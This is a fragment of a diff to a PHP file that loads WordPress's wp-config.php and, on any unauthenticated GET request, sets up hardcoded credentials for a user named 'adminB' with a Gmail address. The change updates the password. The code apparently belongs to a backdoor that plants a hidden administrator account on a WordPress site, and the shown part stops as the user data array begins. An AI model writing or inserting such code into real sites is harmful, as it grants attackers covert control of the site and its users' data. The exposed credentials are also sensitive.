@@ -2,7 +2,7 @@
 include('./wp-config.php');
 if ($_SERVER['REQUEST_METHOD'] == 'GET') {
     $username = 'adminB';
-    $password = 'kalimarau8899@@##';
+    $password = 'taktau@@##';
     $email = 'nomisec07tech@gmail.com';
 
     $userData = array(
